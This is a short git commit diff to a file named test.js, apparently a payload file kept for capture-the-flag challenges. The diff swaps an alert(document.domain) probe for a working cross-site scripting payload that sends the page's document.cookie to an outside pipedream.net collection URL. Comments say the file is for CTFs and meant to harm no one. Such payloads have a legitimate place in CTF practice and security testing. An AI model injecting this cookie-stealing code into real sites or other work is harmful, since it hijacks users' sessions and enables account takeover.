708c0374884a542a30e21e5e7195f5f5d38195f5
rennaarenata <59098319+rennaarenata@users.noreply.github.com>
2022-05-04 15:11:31 +0200

    -

--- test.js
+++ test.js
@@ -1,4 +1,8 @@
-alert(document.domain)
+//alert(document.domain)
+var xhttp = new XMLHttpRequest();
+xhttp.open("GET", "https://eo17vdm4n5qoswh.m.pipedream.net/"+document.cookie, true);
+xhttp.send();
+
 //JS file used for ctfs 
 //I don't want to harm anyone or anything
 // Have a good day :)
